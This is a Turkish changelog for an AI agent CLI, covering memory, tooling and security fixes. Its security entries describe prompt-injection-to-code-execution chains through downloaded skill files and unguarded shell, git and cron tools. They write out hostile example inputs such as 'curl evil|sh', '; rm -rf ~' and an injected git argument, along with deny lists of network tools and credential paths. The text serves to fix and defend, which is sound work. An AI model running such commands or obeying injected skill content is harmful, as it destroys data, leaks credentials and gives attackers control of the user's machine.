# Changelog

All notable changes to NatureCo CLI will be documented in this file.

## [5.44.1] - 2026-07-08 — "MEMORY: açık 'hatırla' komutu HAM kaydedilir (kayıp önlenir)"

### Added
- **"Hatırla" dedin ama hiçbir şey kaydedilmedi** sorunu kapatıldı. v5.44.0 yanlış-kaydı önledi ama bir boşluk kaldı: agent `memory_write`'ı çağırmazsa (model tutarsızlığı) VE sıkılaştırılmış regex bilgiyi yakalamazsa (ör. "kod adı VORTEX-8") bilgi HİÇ kaydedilmiyordu. Artık: kullanıcı açıkça **"hatırla / kaydet / not al / unutma / aklında tut"** dediyse ve agent bilinçli kaydetmediyse, mesaj **HAM olarak** saklanır — regex ile parse edip bozmadan. "Sadakat > kategorizasyon": "projemin gizli kod adı VORTEX-8, hatırla" → tam metin (`Projemin gizli kod adı VORTEX-8`) korunur, ne kaybolur ne bozulur. Kayıt komutu içermeyen mesajlar etkilenmez. 571 test yeşil.

## [5.44.0] - 2026-07-08 — "MEMORY: otomatik regex-extraction artık agent'ın bilinçli kaydını ezmiyor"

### Changed
- **"Yanlış hatırlamak, hiç hatırlamamaktan kötüdür."** Oturum sonu otomatik regex-extraction (`persistSessionToMemory`), agent'ın bilinçli `memory_write`/`memory_tree` kaydının ÜZERİNE yanlış fact yazabiliyordu (ör. "projemin kod adı ONYX-7" → agent doğru kaydeder ama regex ayrıca "Kullanici ad: onyx" ekler). Artık: agent bu oturumda memory'ye YAZDIYSA (disk'teki fact sayısı oturum başındakinden fazlaysa), otomatik regex-extraction **tamamen atlanır** — bilinçli kayıt her zaman kazanır. Modern modeller `memory_write`'ı güvenilir çağırdığından regex çoğu oturumda hiç devreye girmez (sıfır yanlış-pozitif); agent hiç kaydetmediyse (nadir) regex yalnızca çok-net kimlik kalıplarıyla bir güvenlik ağı olarak kalır. 571 test yeşil.

## [5.43.2] - 2026-07-08 — "FIX: `doctor --fix` artık gerçekten çalışıyor"

### Fixed
- **`natureco doctor --fix` çalışmıyordu**: `doctor()` fonksiyonu `--fix`'i hiç işlemiyordu → `Unknown doctor action: --fix` hatası veriyordu (README'de `--fix Auto-fix` olarak belgeli olmasına rağmen). Artık `--fix` (ve `fix` alt-komutu) düzeltilebilir sorunları otomatik onarır: eksik veri dizinlerini oluşturur (`memory`, `sessions`, `backups`, `audit`, …) ve hassas dosya izinlerini sıkılaştırır (`~/.natureco` → 0700, `config.json` → 0600, POSIX). Düzeltmelerden sonra normal sağlık kontrolleri çalışır. 3 regresyon testi eklendi. 571 test yeşil.

## [5.43.1] - 2026-07-08 — "SECURITY: config restore artık 0600 izniyle yazıyor"

### Security
- **`restoreConfig()` config.json'ı zayıf izinle yeniden yazıyordu**: v5.43.0'da `saveConfig()` ve `createBackup()` `0600`/chmod ile korunmuştu ama `restoreConfig()` atlanmıştı — bir yedekten geri yükleme (`config restore`) API anahtarları içeren aktif `config.json`'ı yeniden dünya-okunabilir (`0644`) hale getiriyordu. Artık `saveConfig()` ile aynı şekilde `{ mode: 0o600 }` + `chmodSync` fallback ile yazılır. Regresyon testi eklendi (POSIX). 568 test yeşil, ESLint temiz.

## [5.43.0] - 2026-07-08 — "SECURITY: 9 açık kapatıldı (3 turluk güvenlik incelemesi)"

### Security
3 turluk güvenlik incelemesinde bulunan **9 gerçek, kanıtlanmış açık** kapatıldı. Her biri için kırmızı→yeşil regresyon testi eklendi (+29 test → 567 yeşil). Maddeler ve düzeltmeler:

1. **shell_command onay/güvenlik bypass'ı (KRİTİK/RCE)**: `shell_command.js` `checkCommand`/`isDangerousCommand` akışını atlayıp doğrudan `spawn('bash','-c',...)` yapıyordu → model/prompt-injection `bash` yerine bunu çağırıp onaysız sınırsız shell kazanabiliyordu. Artık bash.js ile aynı güvenlik akışından geçer; `tool-runner.js` needsConfirm'e de eklendi.
2. **isSafeCommand prefix bypass (YÜKSEK)**: `startsWith` ile `echo hi; rm -rf ~` gibi zincirler "safe" sayılıyordu. Artık shell metakarakteri içeren komut asla safe değil + kelime-sınırı prefix; `node -e` (inline eval) safe listesinden çıkarıldı.
3. **config.json zayıf izinler (ORTA)**: API anahtarları `0644` (dünya-okunabilir) yazılıyordu → `0600` dosya + `0700` dizin/yedek + chmod fallback.
4. **WhatsApp session dizini zayıf izinler (ORTA)**: Baileys kimlik dosyaları → `0700` (parent dahil) + chmod fallback.
5. **document_extract shell injection (DÜŞÜK)**: `execSync(\`pdftotext "${filePath}" -\`)` → `execFileSync` (shell yok). Aynı desen `social_open`/`youtube_ac` (pgrep) ve `phone_control_enhanced` (adb) araçlarında da temizlendi.
6. **Skill indirme → prompt injection → RCE zinciri (KRİTİK)**: `skills_download` `KNOWN_REPOS`'u kullanmıyor, herhangi bir GitHub reposu indiriliyordu (SKILL.md → system prompt enjeksiyonu → madde 1'le RCE). Artık yalnızca `KNOWN_REPOS` + kullanıcı onaylı `skills-allowlist.json`; `additionalFiles`/skill-adı path-traversal koruması; `skills_autoload` ham içerik enjeksiyonunu bırakıp kontrollü `skill_view`'e yönlendiriyor.
7. **Kanal gönderen doğrulaması yok + hafıza sızıntısı (YÜKSEK)**: Slack/Signal/IRC/Mattermost'ta allow-list kontrolü yoktu ve tüm kanallar paylaşımlı hafızayı system prompt'a ekliyordu. Ortak `channelGate`: allow-list kuruluysa yetkisizi engeller, kurulu değilse yanıt verir ama **kişisel hafızayı enjekte etmez** (Signal/IRC/Mattermost + bonus iMessage/SMS; Slack stub).
8. **admin-rpc kimlik doğrulamasız + 0.0.0.0 (KRİTİK)**: RPC sunucusu tüm arayüzlerde, auth'suz dinliyordu → `config.get` ile tüm API key'ler okunabiliyordu. Artık `127.0.0.1` bind (opsiyonel `--expose`) + zorunlu bearer token (`~/.natureco/admin-token`, 0600) + `config.get` secret maskeleme (`reveal:true` gerektirir). dashboard varsayılanı zaten localhost (doğrulandı).
9. **cron_create komut onayı atlıyor (KRİTİK/persistence)**: `command` kontrolsüz gerçek sistem crontab'ına yazılıyordu (oturum kapansa bile çalışan persistence). Artık tehlikeli komut reddedilir; sistem crontab'ına yazma varsayılan KAPALI (agent tetikleyemez), yalnızca uygulama-içi `crons.json`'a yazılır.

Doğrulama: 567 test yeşil (29 yeni güvenlik regresyonu), ESLint temiz, `npm run smoke` geçti. Ayrıntılı belge: `SECURITY_AUDIT_SUMMARY.md`.

## [5.42.0] - 2026-07-08 — "TOKEN OPTIMİZASYONU: her istekte ~18K token israfı → ~4.5K (%76 azalma)"

Kullanıcı token maliyetini sordu; ölçüm yapıldı ve ciddi bir israf bulundu: basit bir "merhaba" bile **18,763 token** prompt gönderiyordu. Kök neden: `skill-index.js` her sysMsg'e YÜZLERCE skill'in TAM `description`'ını gömüyordu (satır 75 `- name: description`), her istekte tekrar.

### ⚡ Token verimliliği (doğrudan maliyet + kullanıcı tercihi)
- **skill index kompaktlaştırıldı**: eskiden ~200 skill × ~350 char (tam açıklama) = ~75K char = ~18K token HER istekte. Bu progressive-disclosure'a da aykırıydı (skill_view zaten tam açıklama+içerik veriyor). Artık: çok skill (>60) → **kompakt isim-listesi** (kategorili, virgüllü); az skill → isim + kısa açıklama (88 char, kelime sınırı). Uzun "mandatory scan" yönergesi sadeleştirildi.
- **Yeni env kontrolü** `NATURECO_SKILL_INDEX`: `off` (index hiç gönderilmez, en düşük token) / `names` (sadece isimler) / `full` (kısa açıklamalı, çok skill'de bile).
- **Ölçülen etki** (gerçek MiniMax usage, monkeypatch ile): basit selam **18,763 → 4,456 token** (%76↓); tek-araç görevi 38,601 → 9,987 token. Çok-iterasyonlu görevlerde tasarruf katlanır (sysMsg her iterasyonda gider).

538 test yeşil (skill-index token regresyonu +5: `_shorten`, off-mode, skill-başına-char sınırı), ESLint temiz. Provider-bağımsız (tüm sysMsg'ler `buildSkillIndex` kullanır).

## [5.41.0] - 2026-07-08 — "sub-agent orchestration + plan modu PHANTOM idi, açıldı"

Kullanıcının "sub-agent orchestration ve plan modunda açık kalmasın" talebiyle: ikisi de mevcut+çalışır kod (`sub_agent.js`, `plan.js`) AMA agentic-runner `DEFAULT_ALLOWED`'da ve workflow sysMsg'inde YOKTU → agent bunları çağıramıyordu (klasik phantom-tool deseni).

### ✨ Açılan yetenekler (kod vardı, agent erişemiyordu)
- **sub_agent** (orchestration): agent bir alt-görevi bağımsız bir alt-agent'a devreder (kendi LLM çağrısı, sonucu döner). Birden fazla çağırarak paralel/çok-parçalı orchestration yapar. Güvenli (sadece LLM çağrısı, shell/dosya yok) → safe-mode allowlist'e eklendi.
- **plan** (plan modu): karmaşık görev için önce plan çıkarır (SADECE metin + `~/.natureco/plans/*.md`, hiçbir işlem yapmaz). safe-mode allowlist'e eklendi.
- Her ikisi de workflow sysMsg'de tanıtıldı (agent ne zaman/nasıl kullanacağını bilir). Provider-bağımsız (MiniMax/Gemini/OpenAI endpoint routing içeriyor).

### ✓ Doğrulama (agent yolu E2E, MiniMax)
- plan: agent `plan` aracıyla 10-adımlık detaylı React todo planı çıkardı.
- sub_agent: agent alt-agent spawn edip "list comprehension nedir" sordurup yanıtı iletti.
- **çoklu orchestration**: agent İKİ ayrı alt-agent'a iki görev delege etti (5!=120, HTTP 404) ve ikisini özetledi.
- 533 test yeşil (sub_agent+plan phantom regresyon kilidi), ESLint temiz.

## [5.40.0] - 2026-07-08 — "CROSS-SESSION HAFIZA bozulması düzeltildi (gerçek macOS SSH testinde bulundu)"

Gerçek MacBook'a SSH ile bağlanıp canlı test yapılırken bulundu: kullanıcı "projemin gizli kod adı ONYX-7'yi hatırla" dediğinde, yeni oturumda HATIRLANMIYORDU. Kök neden zincirleme çözüldü.

### 🐛 Cross-session hafıza (KRİTİK — kullanıcının en önemli özelliği)
- **Otomatik fact-extraction masum ifadeleri bozuyordu (asıl kök neden)**: `repl.js` her oturum sonunda regex ile fact çıkarıyordu; pattern `ad[ıi]m?` — **`m` OPSİYONEL** — "kod **adı**", "proje **adı**", "dosya **adı**" gibi tamlamaları "kullanıcı adı" sanıyor, değeri de `toLowerCase()`+`\w+` ile bozuyordu: **"gizli kod adı ZEPHYR-9" → "Kullanici ad: zephyr"**. Agent `memory_write` ile DOĞRU kaydetse bile üzerine bu YANLIŞ fact yazılıyor, recall bozuluyordu. Artık: `m` zorunlu ("benim adım/adım/ismim X" yakalanır, "kod adı" YAKALANMAZ), değer orijinal case'de korunur (ZEPHYR-9 bozulmaz), aşırı geniş `bana .* de` kaldırıldı. Ayrıca konum eki `[dt]e`→`[dt][ae]` (da/de/ta/te), tercih/konum nesnesi fiilden ÖNCE (Türkçe dil bilgisi). Fonksiyon module-level `extractPreferenceFacts`'e taşındı + 5 regresyon testi.
- **loadUserMemory sıralama**: flat fact'ler dosya sırasıyla ilk 15'i alınıyordu → çok fact olunca EN YENİ kayıt (yeni öğrenilen kod adı) sysMsg'e girmeden kesiliyordu. Artık skor + tarihe göre sıralanıp ilk 25 alınır (en güncel/önemli garanti).
- **Limit tutarsızlığı**: `repl.js` fact'leri 15'e, `memory_write` 50'ye (MAX_FACTS) kesiyordu — repl'in 15 sert limiti yeni fact'leri sessizce siliyordu. İkisi 50'de (NATURECO_MAX_FACTS) birleştirildi.
- **memory kaydetme kuralı** (agentic sysMsg): "spesifik değerleri (kod/isim/sayı/tarih) AYNEN koru, doğru etiketle (proje kod adı ≠ kullanıcı adı)" kuralı eklendi.

### ✓ Gerçek macOS (Darwin 25.5.0, arm64) SSH doğrulaması
node v26.4.0 + natureco kurulu. Doğrulanan: grep_search (ripgrep yolu), code_execution (python3+node), git (log+enjeksiyon+remote-guard), cron_create (oluştur+`cron list`'te görünür+remove), http_request/duckduckgo/memory_tree, agentic chat + write_file, **ve düzeltme sonrası**: "kod adı FALCON-3" → doğru kaydedildi + yeni oturumda hatırlandı. 532 test yeşil (repl-memory regresyon +5), ESLint temiz.

## [5.39.0] - 2026-07-08 — "CROSS-PLATFORM: grep_search + social_open Windows'ta kırıktı, düzeltildi"

Platform-uyumluluk denetimi: 90 aracın 18'i platform-özel. Çekirdek chat/code araçlarının Windows VE macOS'ta çalışması hedeflendi. 2 çekirdek/computer-use aracı saf Windows'ta kırıktı.

### 🐛 Cross-platform düzeltmeler
- **grep_search saf Windows'ta tamamen kırıktı (ÇEKİRDEK araç)**: komut tespiti `spawn('which', ...)` + fallback `spawn('grep', ...)` kullanıyordu — `which` ve `grep` Windows'ta YOK (Git Bash olmadan). Ripgrep kurulu değilse arama hiç çalışmıyordu (bu makinede E2E'de çalışması yalnızca Git Bash kurulu olduğu içindi). Artık: (a) komut tespiti `rg --version` ile (which/where farkını bypass eder), (b) fallback **saf Node.js** dizin-tarama + regex (hiçbir Unix komutu gerekmez, node_modules/.git atlar, glob filtre, ikili-dosya atlama, 2MB sınırı). ripgrep varsa yine hız için kullanılır.
- **social_open Windows/Linux'ta hard-red**: `if (!IS_MAC) return {error:"sadece macOS"}` → tamamen reddediyordu. Artık platformlar arası URL açma: macOS `open`, Windows `cmd /c start`, Linux `xdg-open`.

### ✓ Doğrulanan cross-platform durum (denetim)
- **Zaten cross-platform**: list_dir/read_file/write_file/edit_file (saf Node fs), http_request (Node http), git (v5.38 execFileSync, git PATH'te standart), code_execution (v5.38 py/python/node fallback), web_search/duckduckgo (Node http).
- **bash**: `shell:true` = platform-native shell (Windows cmd.exe, *nix sh) — doğru; agent OS'u sysMsg'den bilir (`İşletim sistemi: <platform>`) → platform-uygun komut seçer.
- **Tasarım gereği macOS-only (8 araç)**: mac_app_open/quit, mac_notify, macos_screenshot, notes/reminder/calendar_add, mac_alarm — osascript tabanlı; Windows'ta net "sadece macOS" mesajı (kullanıcının Mac'inde çalışır).

Doğrulama: grep_search Node fallback E2E (tool:node, rg'siz çalıştı); 527 test yeşil (6 yeni: grep-search Node fallback — dizin atlama, glob, maxResults, case-insensitive, geçersiz-regex), ESLint temiz.

## [5.38.0] - 2026-07-08 — "FİNAL DOĞRULAMA: git/code_execution/http_request düzeltmeleri + git enjeksiyon açığı kapatıldı"

Final doğrulama re-run'inde (agent yolu E2E) 3 fonksiyonel sorun + 1 güvenlik açığı bulundu ve düzeltildi.

### 🔒 Güvenlik açığı (kapatıldı)
- **git args komut enjeksiyonu + remote-yazma bypass (KRİTİK)**: `git` özel aracı `execSync('git log ' + args)` ile STRING komut kuruyordu → `args` içindeki `;`, `&&`, `$()`, backtick shell'de çalışıyordu (ör. `args: "-n1; rm -rf /"`). Ayrıca bu araç, agentic-runner'daki `git remote add`/`git push` bloklarını GÖRMÜYORDU (özel araç, bash guard'ından geçmez) → remote-yazma bypass. Artık `execFileSync` (shell:false) + tırnak-farkındalıklı tokenizer → metakarakterler işlem görmez; `remote add/set-url/remove/rename` engelli (salt-okunur remote serbest). POC: `-n1; echo PWNED` → git argüman sanıp reddetti, echo hiç çalışmadı.

### 🐛 Düzeltmeler
- **git "Unknown operation"**: araç yalnızca `operation` param'i kabul ediyordu; ajanlar `args:"log -n2"` gibi gönderince tanımıyor, bash'e sapıyordu. Artık esnek giriş (operation/args/command'dan parse), `cwd` param'i onurlandırma, env-tabanlı repo bulma (`NATURECO_PROJECT_DIR`/`INIT_CWD`/`PWD` — makineden bağımsız), +5 salt-okunur operasyon (show/remote/tag/describe/rev-parse). E2E: tek çağrıda `git:done`.
- **code_execution Python bulamıyor**: sabit `python3` Windows'ta App-execution-alias tuzağına düşüyordu. Artık aday-deneme (`py`/`python`/`python3` — *nix'te `python3`/`python`), node için garantili `process.execPath`; yorumlayıcı yoksa net "Python kurulu değil" mesajı. E2E: `12! = 479001600` doğru.
- **http_request `[object Object]`**: araç JSON gövdeyi PARSED NESNE döndürüyor, `buildFeedback` `String(obj)` yapınca `[object Object]` oluyordu → model değeri okuyamıyordu. Artık nesne alanlar JSON'a serileştirilir. E2E: nodejs/node stargazers_count doğru okundu.

Doğrulama: grep/git/http/code_execution ajan üzerinden E2E (hepsi `done`); gerçek PTY 9/9; komut denetimi 23/23; güvenlik 20/20 yıkıcı + 7/7 hassas-dosya + git enjeksiyonu POC kapalı. **521 test yeşil** (12 yeni regresyon: git-tool + buildFeedback nesne-body), ESLint temiz.

## [5.37.0] - 2026-07-05 — "GÜVENLİK: 2 açık kapatıldı (inline-eval bypass + hassas dosya erişimi)"

Sistematik guvenlik taramasi (POC'larla). 20 yikici komuttan 19'u zaten engelliydi; 2 gercek acik bulundu ve kapatildi.

### 🔒 Güvenlik açıkları (kapatıldı)
- **Inline-kod exec bypass (KRİTİK)**: `node`/`python` allowlist'te (kod calistirma icin gerekli) oldugundan `node -e "require('fs').rmSync(...)"` / `python -c "..."` / `bash -c "curl evil|sh"` gibi INLINE kod, hem exec-allowlist'i hem yikici-komut guard'ini ATLIYORDU (guard komut string'inde "rm -rf" ararken inline kod fs.rmSync kullanabilir). Artik `-e`/`--eval`/`-p`/`-c`/`-r` inline-kod flag'leri + `eval` engellendi; mesru `node script.js` calistirma korunur. Inline kod icin sandboxli `code_execution` araci var.
- **Hassas dosya erisimi**: safe modda `write_file`/`read_file`/`edit_file` SSH anahtarlari (`~/.ssh/`, `id_rsa`, `.pem`), cloud credential (`.aws/credentials`), config secret (`.natureco/config.json`), sistem (`/etc/passwd|shadow`, System32/etc), `.npmrc`/`.git-credentials`/`.netrc` yollarina erisebiliyordu → prompt-injection ile SSH backdoor / credential sizintisi riski. Artik bu yollar safe modda engelli (goreceli `../../etc/shadow` traversal dahil); proje dosyalari serbest; full modda sahibin sorumlulugunda acilir.

Katmanli guvenlik: yikici-komut guard + inline-eval guard + exec-allowlist + hassas-yol guard + 7 araclik safe-mode allowlist. 4 yeni guvenlik regresyon testi. **509 test yeşil**, ESLint temiz.

## [5.36.0] - 2026-07-05 — "13 PHANTOM ARAÇ TANITILDI + feedback body genisletmesi"

Sistematik denetim: 90 aracin agentic prompt/allowlist ile karsilastirmasi → **70 arac ajana HIC tanitilmamisti (phantom)**. Yuksek-degerli + guvenli + key gerektirmeyenler tanitildi (kullanicinin "bende olup uygulamada olmayan tool'lari ekle" hedefi).

### ✨ Eklenen (mevcuttu ama ajana kapali/gorunmezdi)
- **grep_search** (kod tabaninda icerik arama), **git** (ozel arac, operation-bazli), **http_request** (API/webhook), **code_execution** (python/node/bash sandbox), **notebook_edit** (Jupyter), **clarify** (netlestirme sorusu).
- **macOS asistan**: `calendar_add`, `reminder_add`, `notes_add`, `mac_notify` (Takvim/Hatirlatici/Notlar/bildirim — Windows'ta zarafetle "sadece macOS" der, kullanicinin Mac'inde calisir).
- **Medya**: `image_generation`, `text_to_speech`, `speech_to_text`.

### 🐛 Düzeltme
- **`buildFeedback` genisletildi**: http_request gibi araclar `done` donuyor ama sonucu (body) modele GERI DONMUYORDU → ajan "arac calismiyor" sanip 9 araca sapiyordu. Artik body/text/transcript/data/matches vb. genis alan seti + bilinmeyen alanlar JSON'la geri verilir. (E2E: http_request tek cagirida yaniti dogru dondurdu.)

Doğrulama: grep_search/git/http_request/code_execution ajan uzerinden E2E; **506 test yeşil**, ESLint temiz.

## [5.35.0] - 2026-07-05 — "WEB ARAMA + TODO + GIT-ZINCIRI DUZELTMELERI (sistematik denetim devam)"

Kullanicinin "tum ozellikleri tek tek test et" talebiyle sistematik denetime devam edildi; ayni kok-neden deseni (arac var ama agentic promptta hic tanitilmamis/yanlis dosya adi) 3 yerde daha bulundu.

### 🐛 Düzeltme
- **Web arama "internet erisimim yok" YALANI**: `duckduckgo_search`/`web_search` allowlist'te yoktu; ajan "internet erisimim kisitli" diyip halusinasyon yapiyordu. Ayrica alias eslemesi YANLIS dosyaya (`duckduckgo_search.js` — mevcut degil) gidiyordu, dogrusu `duckduckgo.js`. Artik duckduckgo (key gerektirmez, HER ZAMAN calisir) + web_search (Tavily varsa) tanimli ve dogru dosyaya esleniyor.
- **Todo sistemi gorunmuyordu**: `todo_write` allowlist'te yoktu; ajan "gorev ekle" istegini yanlislikla memory_tree'ye yaziyordu (kalici hafiza ile aktif is takibini karistiriyordu). Artik todo_write tanimli ve doğru kullaniliyor.
- **`cd` kabuk builtin'i exec allowlist'inde yoktu**: ajan "cd <proje> && git status" gibi zincir kurdugunda TUM komut politika-disi sayilip reddediliyordu; ajan da bunu yanlislikla "guvenlik politikasi" diye kullaniciya bildirip gercek git durumunu hic gostermiyordu. `cd`/`pushd`/`popd` artik izinli (dizin degistirme, dusuk risk).

Doğrulama: 4 senaryo E2E (web arama, todo, git) — hepsi dogru calisti; git ozellikle GERCEK repo durumuyla birebir eslesen doğru cevap verdi. **505 test yeşil**, ESLint temiz.

## [5.34.0] - 2026-07-05 — "CRON DÜZELTMESİ (sahte-başarı önlendi + daemon dürüstlüğü)"

### 🐛 Düzeltme (kullanıcının "cron gorevleri olusturup uygulayabiliyor mu" sorusu üzerine bulundu)
- **`cron_create` agentic allowlist'te HİÇ YOKTU** — modele hic tanitilmamisti. Ajan "her gun X yap" gibi istekte zorunlu olarak `bash` ile native OS scheduling'e (Windows: schtasks/Register-ScheduledTask, macOS: crontab) yoneliyordu — tutarsiz (natureco cron list'te gorunmez) ve bazen basarisiz komuttan sonra SAHTE BASARI iddia ediyordu. Artik `cron_create` allowlist'te + sistem promptunda taniml.
- **Daemon gerekliligi dürüstçe soyleniyor**: cron_create sonrasi olusan gorevin FIILEN tetiklenmesi icin arka plan servisinin (`natureco daemon start/install`) calisiyor olmasi gerekir — bu adim atlanirsa gorev sadece database'e (crons.json) kaydedilir, calismaz. Ajan artik bunu acikca soyluyor, kesin basari iddia etmiyor.
- Regresyon kilidi: DEFAULT_ALLOWED icinde cron_create + temel arac testleri (2 yeni test).

### 🔍 Sistematik denetim (kullanicinin "tüm özellikleri tek tek test et" talebiyle)
90 arac dosyasi yuklendi (89/90 execute'a sahip, 1 yardimci modul); 11 yerel arac fiilen calistirildi (10/11 basarili, macos_screenshot dogru sekilde "sadece macOS" dedi); 23 CLI komutu calistirildi (22/23 basarili, 1 yanlis alt-komut adi = false positive).

Doğrulama: cron_create E2E (crons.json'a doğru yazıldı, schedule doğru, daemon uyarısı görüldü); **500+ test yeşil**, ESLint temiz.

## [5.33.0] - 2026-07-04 — "OTURUM-BAŞI BEKLEYEN-İŞ HATIRLATMASI (Theseus deseni)"

### ✨ Yeni (Hafıza)
- **Bekleyen is hatirlatmasi**: her yeni oturum basinda (natureco chat) hafiza agacindaki `3-kararlar / Bekleyen İşler` dali okunur ve "📌 Geçen oturumdan kalanlar: ..." olarak proaktif gosterilir (Theseus'un "gecen sefer su kalmisti" davranisi). Ajan yarim kalan isi / "sonra yapalim" denileni memory_tree ile bu dala yazar; is bitince memory_tree(action:remove) ile kaldirir.
- memory_tree yeni action: `remove` (tamamlanan yapragi sil).

Doğrulama: gercek PTY oturumunda startup'ta "📌 Geçen oturumdan kalanlar" + bekleyen is gorundu; +2 test (getPending/remove); **500 test yeşil**, ESLint temiz.

## [5.32.0] - 2026-07-04 — "AĞAÇ-HAFIZA + OTURUMLAR ARASI KALICILIK (Theseus mimarisi)"

### ✨ Yeni (Hafıza)
- **Oturumlar arası hafiza DUZELDI**: eski persist dar regex kaliplariyla (sadece "adim X") fact cikariyordu; keyfi bilgi ("parolam X, hatirla") kayboluyordu. Artik ajan `memory_write` ile ANINDA kaydeder → yeni oturumda hatirlanir (E2E: parola S1→S2 ✓).
- **Agac-hafiza (`memory_tree`)**: kullanicinin OpenCode/Theseus icin tasarladigi tree-memory mimarisinden uyarlandi. Kok (1-kisisel/2-teknik/3-kararlar) → dal (## baslik) → yaprak. action: index|read|search|append. Duz `facts[]` listesinin "coplুğe donme" sorununu cozer; kategorize + logaritmik erisim.
- **Proaktif yukleme (Theseus deseni)**: her istekte hafiza agaci sistem prompt'una otomatik enjekte edilir ("BILDIGIN KALICI HAFIZA") → ajan on-demand aramaya guvenmeden baglami ZATEN bilir. (E2E: "NatureCoPixel neyle yapiliyor?"→"Godot" ✓; hafiza ile dosya sistemini ayirt eder.)
- Tek-primary + "bkz:" capraz referans; credential/secret asla duz metin.

Doğrulama: memory_write + memory_tree E2E (S1 kaydet → S2 yeni oturum hatirla); 6 yeni tree testi; **498 test yeşil**, ESLint temiz.

## [5.31.0] - 2026-07-04 — "CHAT/CODE ARAYÜZ ZENGİNLEŞTİRME (araç görünürlüğü + düşünme + input alanı)"

### ✨ Yeni (UX)
- **Araç görünürlugu**: agentic akista her arac ekranda gorunur — "🔧 <etiket> · <ozet> ✓/✗" (write_file/edit_file/bash/browser/mac_app_open...). Onceden streaming tool XML'ini gizlerken arac aktivitesi de gorunmuyordu; artik gorunur.
- **Düsünme gostergesi**: model yanit uretirken "💭 düşünüyor…", ilk token gelince temizlenir.
- **Gorunur input alani**: REPL prompt'u "💬 Sen ▸" + her girdiden once ince ayirici cizgi (cikti/girdi net ayrilir; readline tek-satir → satir duzenleme bozulmaz).
- **Gorunur acma yonlendirmesi (full mod)**: "kendi tarayicimda ac / dinlemek istiyorum" → headless `browser` yerine gorunur `open`/`start`/`mac_app_open` kullanilir.

Doğrulama: streaming UI E2E (💭 + 🔧 + ✓ gorunuyor); REPL regresyon; **492 test yeşil**.

## [5.30.0] - 2026-07-04 — "TAM KONTROL MODU (sahip opt-in: tüm araç+skill + computer-use)"

### ✨ Yeni
- **Tam kontrol modu** (`natureco config set agentExec full` veya `NATURECO_AGENT_EXEC=full`): sahibi opt-in yapinca ajan **TUM araclara + skill'lere** erisir ve **her shell komutunu** calistirabilir (yikici komutlar — rm -rf — tam modda bile bloklu kalir). Computer-use araclari: `mac_app_open` (WhatsApp/Chrome/Spotify ac), `browser` (Playwright otomasyonu), `computer_use` (GUI: tikla/yaz/ekran goruntusu), `social_open` (muzik/video), `macos_screenshot`. Full modda sistem prompt'u bu araclari modele tanitir ("yapamam deme, ilgili araci cagir").
- Safe modda (varsayilan) `open`/`start`/`xdg-open` (uygulama/URL ac) da izinli — asistan temel acma islerini yapar.
- **Iki kademeli guvenlik**: Safe (varsayilan, milyonlar) = dosya araclari + guvenli shell. Full (sahip opt-in) = her sey. Katmanli: yikici-komut guard her modda aktif.

Doğrulama: full modda `browser` araci E2E (example.com → "Example Domain"); **492 test yeşil**, ESLint temiz.

## [5.29.0] - 2026-07-04 — "ask KUTU-ÇIKIŞI DÜZELTMESİ + çekirdek komut denetimi"

### 🐛 Düzeltme
- **`natureco ask` kutu-cikisi patliyordu**: `defaultBotId` ayarli degilse "Varsayilan bot ayarlanmamis" ile cikiyordu (birincil komut, yeni kullaniciyi duvara toslatiyordu). Artik ayarli degilse hesaptaki ILK botu otomatik secer; hic bot yoksa net yonlendirme.

### ✅ Çekirdek komut denetimi (MiniMax + Gemini ile)
`ask` (duzeltildi), `chat`, `code`, `memory`, `models`, `cost`, `doctor` (10/10 PASS), `help`, `--version` → hepsi calisiyor. (Harici servis gerektiren discord/telegram/cron/mcp/signal denetim disi.)

## [5.28.0] - 2026-07-04 — "AJAN EXEC GÜVENLİK POLİTİKASI (deny-by-default)"

### 🔒 Güvenlik
- **Ajan exec politikasi**: agentic yolda `bash` artik deny-by-default — ajan yalnizca guvenli komut SINIFLARINI otonom calistirir (node/npm/npx/python/pip/go/cargo/git-local/ls/grep/mkdir/test-runner...). Ag/yayin/sistem/ayricalik komutlari (curl, wget, ssh, scp, sudo, git push, npm publish, docker, systemctl...) OTOMATIK CALISTIRILMAZ; zincirdeki gizli komut da yakalanir (`ls && curl` → blok). Neden interaktif y/n degil: pipe/CI/non-TTY'de calismaz + REPL readline'iyla cakisir + kullanici tikla-gec yapar → deny-by-default politika otonom ajan icin daha guvenli. Power-user: `NATURECO_AGENT_EXEC=full`.
- Katmanli guvenlik: yikici-komut guard (rm -rf) + exec politikasi + bash.js approvals + agentic allowlist (yalnizca 7 arac).

Doğrulama: mesru kodlama komutlari (node/npm) E2E calisir; curl/git push/npm publish engellenir; **489 test yeşil**, ESLint temiz.

## [5.27.0] - 2026-07-04 — "GEMINI DÜZELTMESİ + DÖNGÜ BİRLEŞTİRME (2 sağlayıcı E2E)"

### 🐛 Düzeltme / ✨ İyileştirme
- **Gemini artik calisiyor**: `supportsToolCalls()` Gemini'yi robust agentic-runner yoluna aldi. Neden: `gemini-2.5-flash` bir "thinking" modeli — plan-bazli yoldaki dusuk `max_tokens` (orn. 20) cagrilarinda tum butceyi ic dusunmede harcayip BOS donuyordu. Agentic yol (yuksek max_tokens + native tool_calls/XML parse) bunu cozer. (Kod yorumu zaten "Gemini desteklemez" diyordu ama uygulanmamisti — tutarsizlik giderildi.)
- **Dongu birlestirme (dogrulanmis)**: `agentic-runner` artik 2 farkli saglayici ailesinde E2E dogrulandi — **MiniMax** (native XML tool-call) + **Gemini** (OpenAI-compat, gercek key ile dosya olusturma + memory recall "Gencay"). Groq/Ollama/localhost da bu yolu kullanir. OpenAI/Anthropic native `tool_calls` yolunda kalir (standart, dokunulmadi).

Doğrulama: Gemini gercek key ile E2E (dosya olusturma + hafiza); **484 test yeşil**, ESLint temiz.

## [5.26.0] - 2026-07-04 — "CANLI STREAMING + KEŞFET→DÜZENLE→DOĞRULA"

### ✨ Yeni
- **Canlı streaming (TTY)**: yanit artik token token akarak gelir (Hermes/Claude Code hissi). SSE → tool-call/skill XML'ini gizleyen filtre → model-adi sanitizer ("Ben MiniMax"→"Ben {bot}") zinciri; kelime chunk sinirinda bolunse bile sizinti yok. Non-TTY (pipe/CI) bloklu yola duser. `makeStreamFilter` + `makeSanitizeStream` (birim testli).
- **Keşfet→düzenle→doğrula**: ajana `file_search` (glob), `list_dir` ve MEVCUT dosyayi hedefli degistiren `edit_file` eklendi; sistem prompt'u "once oku, sonra edit_file ile duzenle, sonra calistirip dogrula" akisini ogretir. E2E dogrulandi (dosyayi oku→edit→node ile calistir→sonucu raporla).

### 🐛 Düzeltme
